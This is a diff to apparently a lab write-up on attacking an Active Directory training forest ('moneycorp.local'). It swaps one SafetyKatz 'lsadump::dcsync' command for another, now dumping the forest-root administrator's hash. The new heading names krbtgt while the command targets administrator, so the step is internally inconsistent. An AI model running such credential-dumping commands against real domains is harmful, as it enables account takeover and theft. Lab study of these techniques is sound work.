@@ -688,8 +688,10 @@ gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
 ![](https://i.imgur.com/3MYuknZ.png)
 
 
-1. Run the dcsync attack
+1. Run the `dcsync` attack against the krbtgt hash of the forest root
 
+```powershell
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\administrator /domain:moneycorp.local" "exit"
 ```
-C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
-```
+
+
